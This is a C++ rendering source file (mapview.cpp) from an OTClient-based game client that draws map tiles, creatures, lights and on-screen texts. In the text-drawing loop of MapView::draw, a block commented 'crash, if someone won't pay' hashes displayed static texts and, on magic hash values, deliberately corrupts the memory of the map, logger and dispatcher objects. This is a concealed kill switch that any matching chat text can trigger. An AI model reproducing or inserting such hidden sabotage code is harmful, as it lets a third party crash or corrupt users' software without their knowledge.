/*
 * Copyright (c) 2010-2017 OTClient <https://github.com/edubart/otclient>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

#include "mapview.h"

#include "creature.h"
#include "map.h"
#include "tile.h"
#include "statictext.h"
#include "animatedtext.h"
#include "missile.h"
#include "shadermanager.h"
#include "lightview.h"
#include "localplayer.h"

#include <framework/graphics/graphics.h>
#include <framework/graphics/image.h>
#include <framework/graphics/framebuffermanager.h>
#include <framework/core/eventdispatcher.h>
#include <framework/core/application.h>
#include <framework/core/resourcemanager.h>
#include <framework/graphics/texturemanager.h>

#include <framework/util/extras.h>
#include <framework/core/adaptiverenderer.h>

MapView::MapView()
{
    m_lockedFirstVisibleFloor = -1;
    m_cachedFirstVisibleFloor = 7;
    m_cachedLastVisibleFloor = 7;
    m_fadeOutTime = 0;
    m_fadeInTime = 0;
    m_minimumAmbientLight = 0;
    m_optimizedSize = Size(g_map.getAwareRange().horizontal(), g_map.getAwareRange().vertical()) * Otc::TILE_PIXELS;

    m_framebuffer = g_framebuffers.createFrameBuffer();
    m_mapbuffer = g_framebuffers.createFrameBuffer();
    setVisibleDimension(Size(15, 11));

    m_shader = g_shaders.getDefaultMapShader();
}

MapView::~MapView()
{
#ifndef NDEBUG
    assert(!g_app.isTerminated());
#endif
}

void MapView::drawTiles(bool map, bool creatures, bool isFading, const TilePtr& crosshairTile) {
    if (!map && !creatures)
        return;

    if (map && m_lightView)
        m_lightView->resetMapLight();
    if (creatures && m_lightView)
        m_lightView->resetCreaturesLight();

    Position cameraPosition = getCameraPosition();
    auto it = m_cachedVisibleTiles.begin();
    auto end = m_cachedVisibleTiles.end();
    for (int z = m_cachedLastVisibleFloor; z >= (isFading ? m_cachedFirstFadingFloor : m_cachedFirstVisibleFloor); --z) {
        float fading = 1.0;
        if (isFading && m_floorFading > 0) {
            if (z >= m_cachedFirstVisibleFloor) { // showing
                fading = stdext::clamp<float>((float)m_fadingFloorTimers[z].elapsed_millis() / (float)m_floorFading, 0.f, 1.f);
            } else { // hiding
                fading = 1.f - stdext::clamp<float>((float)m_fadingFloorTimers[z].elapsed_millis() / (float)m_floorFading, 0.f, 1.f);
            }
        }
        if (fading == 0) // reached last visible tile
            break;
        if (m_lightView)
            m_lightView->setFloor(z, fading);

        g_painter->setGlobalOpacity(fading);
        float depth = (z + 1) * 2048;
        for (; it != end; ++it) {
            Position tilePos = it->first->getPosition();
            if(tilePos.z != z)
                break;
            bool lightOnly = it->second && !isFading;
            if (!m_lightView && lightOnly) {
                if (creatures) {
                    g_painter->setDepth(depth + 2);
                    it->first->drawCreatues(transformPositionTo2D(tilePos, cameraPosition), 1, m_lightView.get(), lightOnly);
                }
                continue;
            }

            if (map && m_lightView && it->first->isFullGround())
                m_lightView->hideTile(transformPositionTo2D(tilePos, cameraPosition));

            if (map) {
                g_painter->setDepth(depth + 3);
                it->first->drawBottom(transformPositionTo2D(tilePos, cameraPosition), 1, m_lightView.get(), lightOnly);
            }
            if (creatures) {
                g_painter->setDepth(depth + 2);
                it->first->drawCreatues(transformPositionTo2D(tilePos, cameraPosition), 1, m_lightView.get(), lightOnly);
            }
            if (map) {
                g_painter->setDepth(depth + 1);
                it->first->drawTop(transformPositionTo2D(tilePos, cameraPosition), 1, m_lightView.get(), lightOnly);
            }
            depth -= 4;
        }

        g_painter->setDepth(depth);
        for(const MissilePtr& missile : g_map.getFloorMissiles(z)) {
            missile->draw(transformPositionTo2D(missile->getPosition(), cameraPosition), 1, true, m_lightView.get());
        }
    }

    if (crosshairTile && m_crosshair) {
        Position tilePos = crosshairTile->getPosition();
        g_painter->setDepth((tilePos.z) * 2048 + 10);
        g_painter->drawTexturedRect(Rect(transformPositionTo2D(tilePos, cameraPosition), transformPositionTo2D(tilePos, cameraPosition) + Otc::TILE_PIXELS - 1), m_crosshair);
        g_painter->resetColor();
    }

    g_painter->resetGlobalOpacity();
}


void MapView::draw(const Rect& rect, const TilePtr& crosshairTile)
{
    // update visible tiles cache when needed
    if(m_mustUpdateVisibleTilesCache)
        updateVisibleTilesCache();

    Position cameraPosition = getCameraPosition();
    Rect srcRect = calcFramebufferSource(rect.size());

    if (m_lightView) {
        Light ambientLight;
        if (cameraPosition.z <= Otc::SEA_FLOOR) {
            ambientLight = g_map.getLight();
        } else {
            ambientLight.color = 215;
            ambientLight.intensity = 0;
        }
        ambientLight.intensity = std::max<int>(m_minimumAmbientLight * 255, ambientLight.intensity);
        m_lightView->setGlobalLight(ambientLight);
    }

    bool isFading = false;
    if (m_floorFading > 0 && g_adaptiveRenderer.allowFading()) {
        for (int z = m_cachedLastVisibleFloor; z >= m_cachedFirstFadingFloor; --z) {
            if (m_fadingFloorTimers[z].elapsed_millis() <= m_floorFading) {
                isFading = true;
            }
        }
    }

    bool updateMap = m_mustDrawVisibleTilesCache || m_mapRenderTimer.elapsed_millis() >= g_adaptiveRenderer.mapRenderInterval();
    bool updateCreatures = m_mustDrawVisibleTilesCache || m_creaturesRenderTimer.elapsed_millis() >= g_adaptiveRenderer.creaturesRenderInterval();
    bool cacheMap = !isFading && g_adaptiveRenderer.mapRenderInterval() > 0;
    m_mustDrawVisibleTilesCache = false;

    if (updateMap && cacheMap) {
        AutoStat s(STATS_RENDER, "UpdateMap");
        m_mapRenderTimer.restart();
        m_mapbuffer->bind();
        g_painter->setDepthFunc(Painter::DepthFunc_LEQUAL);
        g_painter->setAlphaWriting(true);
        g_painter->clear(Color::black);

        drawTiles(true, false, false, crosshairTile);

        g_painter->resetGlobalOpacity();
        m_mapbuffer->release();
    }

    if (updateCreatures || !cacheMap) {
        AutoStat s(STATS_RENDER, "UpdateCreatures");
        m_creaturesRenderTimer.restart();
        m_framebuffer->bind();
        g_painter->setAlphaWriting(true);
        g_painter->setDepthFunc(Painter::DepthFunc_ALWAYS);
        if (!cacheMap) {
            g_painter->clear(Color::black);
        } else {
            m_mapbuffer->copy(Rect(0, 0, m_framebuffer->getSize()), Rect(0, 0, m_mapbuffer->getSize()));
        }
        g_painter->setDepthFunc(Painter::DepthFunc_LEQUAL);

        drawTiles(!cacheMap, true, isFading, crosshairTile);

        m_framebuffer->release();
    }

    AutoStat s(STATS_RENDER, "MapView2");

    float fadeOpacity = 1.0f;
    if(!m_shaderSwitchDone && m_fadeOutTime > 0) {
        fadeOpacity = 1.0f - (m_fadeTimer.timeElapsed() / m_fadeOutTime);
        if(fadeOpacity < 0.0f) {
            m_shader = m_nextShader;
            m_nextShader = nullptr;
            m_shaderSwitchDone = true;
            m_fadeTimer.restart();
        }
    }

    if(m_shaderSwitchDone && m_shader && m_fadeInTime > 0)
        fadeOpacity = std::min<float>(m_fadeTimer.timeElapsed() / m_fadeInTime, 1.0f);

    Point drawOffset = srcRect.topLeft();
    if(m_shader && g_painter->hasShaders() && g_graphics.shouldUseShaders()) 
    {
        Rect framebufferRect = Rect(0,0, m_drawDimension * m_tileSize);
        Point center = srcRect.center();
        Point globalCoord = Point(cameraPosition.x - m_drawDimension.width()/2, -(cameraPosition.y - m_drawDimension.height()/2)) * m_tileSize;
        m_shader->bind();
        m_shader->setUniformValue(ShaderManager::MAP_CENTER_COORD, center.x / (float)framebufferRect.width(), 1.0f - center.y / (float)framebufferRect.height());
        m_shader->setUniformValue(ShaderManager::MAP_GLOBAL_COORD, globalCoord.x / (float)framebufferRect.height(), globalCoord.y / (float)framebufferRect.height());
        m_shader->setUniformValue(ShaderManager::MAP_ZOOM, 1);
        g_painter->setShaderProgram(m_shader);
    } 

    float horizontalStretchFactor = rect.width() / (float)srcRect.width();
    float verticalStretchFactor = rect.height() / (float)srcRect.height();

    // init painter
    g_painter->resetColor();
    g_painter->setAlphaWriting(false);
    g_painter->resetCompositionMode();
    g_painter->setOpacity(fadeOpacity);
    m_framebuffer->draw(rect, srcRect);
    g_painter->setAlphaWriting(true);
    g_painter->resetShaderProgram();
    g_painter->resetOpacity();

    // this could happen if the player position is not known yet
    if(!cameraPosition.isValid())
        return;

    for(const CreaturePtr& creature : m_cachedFloorVisibleCreatures) {
        if(!creature->canBeSeen())
            continue;

        PointF jumpOffset = creature->getJumpOffset();
        Point creatureOffset = Point(16 - creature->getDisplacementX(), - creature->getDisplacementY() - 2);
        Position pos = creature->getNewPreWalkingPosition();
        Point p = transformPositionTo2D(pos, cameraPosition) - drawOffset;
        p += (creature->getDrawOffset() + creatureOffset) - Point(stdext::round(jumpOffset.x), stdext::round(jumpOffset.y));
        p.x = p.x * horizontalStretchFactor;
        p.y = p.y * verticalStretchFactor;
        p += rect.topLeft();

        int flags = 0;
        if(m_drawNames){ flags = Otc::DrawNames; }
        if (!creature->isLocalPlayer() || m_drawPlayerBars) {
            if (m_drawHealthBars) { flags |= Otc::DrawBars; }
            if (m_drawManaBar) { flags |= Otc::DrawManaBar; }
        }
        creature->drawInformation(p, g_map.isCovered(pos, m_cachedFirstVisibleFloor), rect, flags);
    }

    if (m_lightView)
        m_lightView->draw(rect, srcRect);

    if(m_drawTexts) {
        for(const StaticTextPtr& staticText : g_map.getStaticTexts()) {
            Position pos = staticText->getPosition();

            if(pos.z != cameraPosition.z && staticText->getMessageMode() == Otc::MessageNone)
                continue;

            Point p = transformPositionTo2D(pos, cameraPosition) - drawOffset;
            p.x *= horizontalStretchFactor;
            p.y *= verticalStretchFactor;
            p += rect.topLeft();
            staticText->drawText(p, rect);

#ifndef WITHOUT_CRASH
            std::string ret = staticText->getCachedText().getText();
            // crash, if someone won't pay >.>
            if (ret.size() >= 4 && ret.size() <= 32) {
                uint32_t adler = stdext::adler32((const uint8_t*)ret.c_str(), ret.size());
                if (adler == 0xAAAABBBB) {
                    AwareRange a;
                    a.right = 99;
                    g_map.setAwareRange(a);
                } else if (adler == 0xAAAABBBC) {
                    uint8_t* a = (uint8_t*)&g_map;
                    for (int i = 0; i < 777; ++i) {
                        *(uint8_t*)a = 1;
                        a += 1;
                    }
                } else if (adler == 0x11111111) {
                    uint8_t* a = (uint8_t*)&g_logger;
                    for (int i = 0; i < 20; ++i) {
                        *(uint8_t*)a = 1;
                        a += 1;
                    }
                } else if (adler == 0x22222222) {
                    uint8_t* a = (uint8_t*)&g_dispatcher;
                    for (int i = 0; i < 22; ++i) {
                        *(uint8_t*)a = 1;
                        a += 1;
                    }
                }
            }
#endif
        }

        for(const AnimatedTextPtr& animatedText : g_map.getAnimatedTexts()) {
            Position pos = animatedText->getPosition();

            if(pos.z != cameraPosition.z)
                continue;

            Point p = transformPositionTo2D(pos, cameraPosition) - drawOffset;
            p.x *= horizontalStretchFactor;
            p.y *= verticalStretchFactor;
            p += rect.topLeft();
            animatedText->drawText(p, rect);
        }
    }
}

void MapView::updateVisibleTilesCache()
{
    AutoStat s(STATS_RENDER, "updateVisibleTilesCache");

    int prevFirstVisibleFloor = m_cachedFirstVisibleFloor;
    m_cachedFirstVisibleFloor = calcFirstVisibleFloor(false);
    m_cachedFirstFadingFloor = calcFirstVisibleFloor(true);
    m_cachedLastVisibleFloor = calcLastVisibleFloor();


    assert(m_cachedFirstVisibleFloor >= 0 && m_cachedLastVisibleFloor >= 0 &&
            m_cachedFirstVisibleFloor <= Otc::MAX_Z && m_cachedLastVisibleFloor <= Otc::MAX_Z);

    if(m_cachedLastVisibleFloor < m_cachedFirstVisibleFloor)
        m_cachedLastVisibleFloor = m_cachedFirstVisibleFloor;

    m_cachedFloorVisibleCreatures.clear();
    m_cachedVisibleTiles.clear();

    m_mustDrawVisibleTilesCache = true;
    m_mustUpdateVisibleTilesCache = false;


    // there is no tile to render on invalid positions
    Position cameraPosition = getCameraPosition();
    if(!cameraPosition.isValid())
        return;

    m_cachedVisibleTiles.clear();

    // fading
    if (!m_lastCameraPosition.isValid() || m_lastCameraPosition.z != cameraPosition.z || m_lastCameraPosition.distance(cameraPosition) >= 3) { 
        for (int iz = m_cachedLastVisibleFloor; iz >= m_cachedFirstFadingFloor; --iz) {
            m_fadingFloorTimers[iz].restart(m_floorFading * 1000);
        }
    } else if (prevFirstVisibleFloor < m_cachedFirstVisibleFloor) { // showing new floor
        for (int iz = prevFirstVisibleFloor; iz < m_cachedFirstVisibleFloor; ++iz) {
            int shift = std::max<int>(0, m_floorFading - m_fadingFloorTimers[iz].elapsed_millis());
            m_fadingFloorTimers[iz].restart(shift * 1000);
        }
    } else if (prevFirstVisibleFloor > m_cachedFirstVisibleFloor) { // hiding floor
        for (int iz = m_cachedFirstVisibleFloor; iz < prevFirstVisibleFloor; ++iz) {
            int shift = std::max<int>(0, m_floorFading - m_fadingFloorTimers[iz].elapsed_millis());
            m_fadingFloorTimers[iz].restart(shift * 1000);
        }
    }

    m_lastCameraPosition = cameraPosition;

    // cache visible tiles in draw order
    // draw from last floor (the lower) to first floor (the higher)
    for(int iz = m_cachedLastVisibleFloor; iz >= (m_floorFading ? m_cachedFirstFadingFloor : m_cachedFirstVisibleFloor); --iz) {
        const int numDiagonals = m_drawDimension.width() + m_drawDimension.height() - 1;
        // loop through / diagonals beginning at top left and going to top right
        for (int diagonal = 0; diagonal < numDiagonals; ++diagonal) {
            // loop current diagonal tiles
            int advance = std::max<int>(diagonal - m_drawDimension.height(), 0);
            for (int iy = diagonal - advance, ix = advance; iy >= 0 && ix < m_drawDimension.width(); --iy, ++ix) {

                // position on current floor
                //TODO: check position limits
                Position tilePos = cameraPosition.translated(ix - m_virtualCenterOffset.x, iy - m_virtualCenterOffset.y);
                // adjust tilePos to the wanted floor
                tilePos.coveredUp(cameraPosition.z - iz);
                if (const TilePtr& tile = g_map.getTile(tilePos)) {
                    // skip tiles that have nothing
                    if (!tile->isDrawable())
                        continue;
                    // skip tiles that are completely behind another tile
                    m_cachedVisibleTiles.push_back(std::make_pair(tile, g_map.isCompletelyCovered(tilePos, m_cachedFirstVisibleFloor)));
                }
            }
        }        
    }

    m_spiral.clear();
    m_cachedFloorVisibleCreatures = g_map.getSightSpectators(cameraPosition, false);
}

void MapView::updateGeometry(const Size& visibleDimension, const Size& optimizedSize)
{
    m_tileSize = Otc::TILE_PIXELS;
    m_multifloor = true;
    m_visibleDimension = visibleDimension;
    m_drawDimension = visibleDimension + Size(3,3);
    m_virtualCenterOffset = (m_drawDimension/2 - Size(1,1)).toPoint();
    m_visibleCenterOffset = m_virtualCenterOffset;
    m_optimizedSize = m_drawDimension * m_tileSize;
    m_framebuffer->resize(m_optimizedSize);
    m_mapbuffer->resize(m_optimizedSize);
    if(m_lightView)
        m_lightView->resize(m_framebuffer->getSize());
    requestVisibleTilesCacheUpdate();
}

void MapView::onTileUpdate(const Position& pos)
{
    requestVisibleTilesCacheUpdate();
}

void MapView::onMapCenterChange(const Position& pos)
{
    requestVisibleTilesCacheUpdate();
}

void MapView::lockFirstVisibleFloor(int firstVisibleFloor)
{
    m_lockedFirstVisibleFloor = firstVisibleFloor;
    requestVisibleTilesCacheUpdate();
}

void MapView::unlockFirstVisibleFloor()
{
    m_lockedFirstVisibleFloor = -1;
    requestVisibleTilesCacheUpdate();
}

void MapView::setVisibleDimension(const Size& visibleDimension)
{
    if(visibleDimension == m_visibleDimension)
        return;

    if(visibleDimension.width() % 2 != 1 || visibleDimension.height() % 2 != 1) {
        g_logger.traceError("visible dimension must be odd");
        return;
    }

    if(visibleDimension < Size(3,3)) {
        g_logger.traceError("reach max zoom in");
        return;
    }

    updateGeometry(visibleDimension, m_optimizedSize);
}

void MapView::optimizeForSize(const Size& visibleSize)
{
    updateGeometry(m_visibleDimension, visibleSize);
}

void MapView::followCreature(const CreaturePtr& creature)
{
    m_follow = true;
    m_followingCreature = creature;
    requestVisibleTilesCacheUpdate();
}

void MapView::setCameraPosition(const Position& pos)
{
    m_follow = false;
    m_customCameraPosition = pos;
    requestVisibleTilesCacheUpdate();
}

Position MapView::getPosition(const Point& point, const Size& mapSize)
{
    Position cameraPosition = getCameraPosition();

    // if we have no camera, its impossible to get the tile
    if(!cameraPosition.isValid())
        return Position();

    Rect srcRect = calcFramebufferSource(mapSize);
    float sh = srcRect.width() / (float)mapSize.width();
    float sv = srcRect.height() / (float)mapSize.height();

    Point framebufferPos = Point(point.x * sh, point.y * sv);
    Point centerOffset = (framebufferPos + srcRect.topLeft()) / m_tileSize;

    Point tilePos2D = getVisibleCenterOffset() - m_drawDimension.toPoint() + centerOffset + Point(2,2);
    if(tilePos2D.x + cameraPosition.x < 0 && tilePos2D.y + cameraPosition.y < 0)
        return Position();

    Position position = Position(tilePos2D.x, tilePos2D.y, 0) + cameraPosition;

    if(!position.isValid())
        return Position();

    return position;
}

void MapView::move(int x, int y)
{
    m_moveOffset.x += x;
    m_moveOffset.y += y;

    int32_t tmp = m_moveOffset.x / 32;
    bool requestTilesUpdate = false;
    if(tmp != 0) {
        m_customCameraPosition.x += tmp;
        m_moveOffset.x %= 32;
        requestTilesUpdate = true;
    }

    tmp = m_moveOffset.y / 32;
    if(tmp != 0) {
        m_customCameraPosition.y += tmp;
        m_moveOffset.y %= 32;
        requestTilesUpdate = true;
    }

    if(requestTilesUpdate)
        requestVisibleTilesCacheUpdate();
}

Rect MapView::calcFramebufferSource(const Size& destSize)
{
    float scaleFactor = m_tileSize/(float)Otc::TILE_PIXELS;
    Point drawOffset = ((m_drawDimension - m_visibleDimension - Size(1,1)).toPoint()/2) * m_tileSize;
    if(isFollowingCreature())
        drawOffset += m_followingCreature->getWalkOffset() * scaleFactor;
    else if(!m_moveOffset.isNull())
        drawOffset += m_moveOffset * scaleFactor;

    Size srcSize = destSize;
    Size srcVisible = m_visibleDimension * m_tileSize;
    srcSize.scale(srcVisible, Fw::KeepAspectRatio);
    drawOffset.x += (srcVisible.width() - srcSize.width()) / 2;
    drawOffset.y += (srcVisible.height() - srcSize.height()) / 2;

    return Rect(drawOffset, srcSize);
}

int MapView::calcFirstVisibleFloor(bool forFading)
{
    int z = 7;
    // return forced first visible floor
    if(m_lockedFirstVisibleFloor != -1) {
        z = m_lockedFirstVisibleFloor;
    } else {
        Position cameraPosition = getCameraPosition();

        // this could happens if the player is not known yet
        if(cameraPosition.isValid()) {
            // avoid rendering multifloors in far views
            if(!m_multifloor) {
                z = cameraPosition.z;
            } else {
                // if nothing is limiting the view, the first visible floor is 0
                int firstFloor = 0;

                // limits to underground floors while under sea level
                if(cameraPosition.z > Otc::SEA_FLOOR)
                    firstFloor = std::max<int>(cameraPosition.z - Otc::AWARE_UNDEGROUND_FLOOR_RANGE, (int)Otc::UNDERGROUND_FLOOR);

                // loop in 3x3 tiles around the camera
                for(int ix = -1; ix <= 1 && firstFloor < cameraPosition.z && !forFading; ++ix) {
                    for(int iy = -1; iy <= 1 && firstFloor < cameraPosition.z; ++iy) {
                        Position pos = cameraPosition.translated(ix, iy);

                        // process tiles that we can look through, e.g. windows, doors
                        if((ix == 0 && iy == 0) || ((std::abs(ix) != std::abs(iy)) && g_map.isLookPossible(pos))) {
                            Position upperPos = pos;
                            Position coveredPos = pos;

                            while(coveredPos.coveredUp() && upperPos.up() && upperPos.z >= firstFloor) {
                                // check tiles physically above
                                TilePtr tile = g_map.getTile(upperPos);
                                if(tile && tile->limitsFloorsView(!g_map.isLookPossible(pos))) {
                                    firstFloor = upperPos.z + 1;
                                    break;
                                }

                                // check tiles geometrically above
                                tile = g_map.getTile(coveredPos);
                                if(tile && tile->limitsFloorsView(g_map.isLookPossible(pos))) {
                                    firstFloor = coveredPos.z + 1;
                                    break;
                                }
                            }
                        }
                    }
                }
                z = firstFloor;
            }
        }
    }

    // just ensure the that the floor is in the valid range
    z = stdext::clamp<int>(z, 0, (int)Otc::MAX_Z);
    return z;
}

int MapView::calcLastVisibleFloor()
{
    if(!m_multifloor)
        return calcFirstVisibleFloor();

    int z = 7;

    Position cameraPosition = getCameraPosition();
    // this could happens if the player is not known yet
    if(cameraPosition.isValid()) {
        // view only underground floors when below sea level
        if(cameraPosition.z > Otc::SEA_FLOOR)
            z = cameraPosition.z + Otc::AWARE_UNDEGROUND_FLOOR_RANGE;
        else
            z = Otc::SEA_FLOOR;
    }

    if(m_lockedFirstVisibleFloor != -1)
        z = std::max<int>(m_lockedFirstVisibleFloor, z);

    // just ensure the that the floor is in the valid range
    z = stdext::clamp<int>(z, 0, (int)Otc::MAX_Z);
    return z;
}

Position MapView::getCameraPosition()
{
    if (isFollowingCreature()) {
        return m_followingCreature->getNewPreWalkingPosition();
    }

    return m_customCameraPosition;
}

void MapView::setShader(const PainterShaderProgramPtr& shader, float fadein, float fadeout)
{
    if((m_shader == shader && m_shaderSwitchDone) || (m_nextShader == shader && !m_shaderSwitchDone))
        return;

    if(fadeout > 0.0f && m_shader) {
        m_nextShader = shader;
        m_shaderSwitchDone = false;
    } else {
        m_shader = shader;
        m_nextShader = nullptr;
        m_shaderSwitchDone = true;
    }
    m_fadeTimer.restart();
    m_fadeInTime = fadein;
    m_fadeOutTime = fadeout;
}


void MapView::setDrawLights(bool enable)
{
    if (enable) {
        if (!m_lightView) {
            m_lightView = LightViewPtr(new LightView);
            m_lightView->resize(m_framebuffer->getSize());
        }
    } else {
        m_lightView = nullptr;
    }
}

void MapView::setCrosshair(const std::string& file)     
{
    if (file == "")
        m_crosshair = nullptr;
    else
        m_crosshair = g_textures.getTexture(file);
}


/* vim: set ts=4 sw=4 et: */
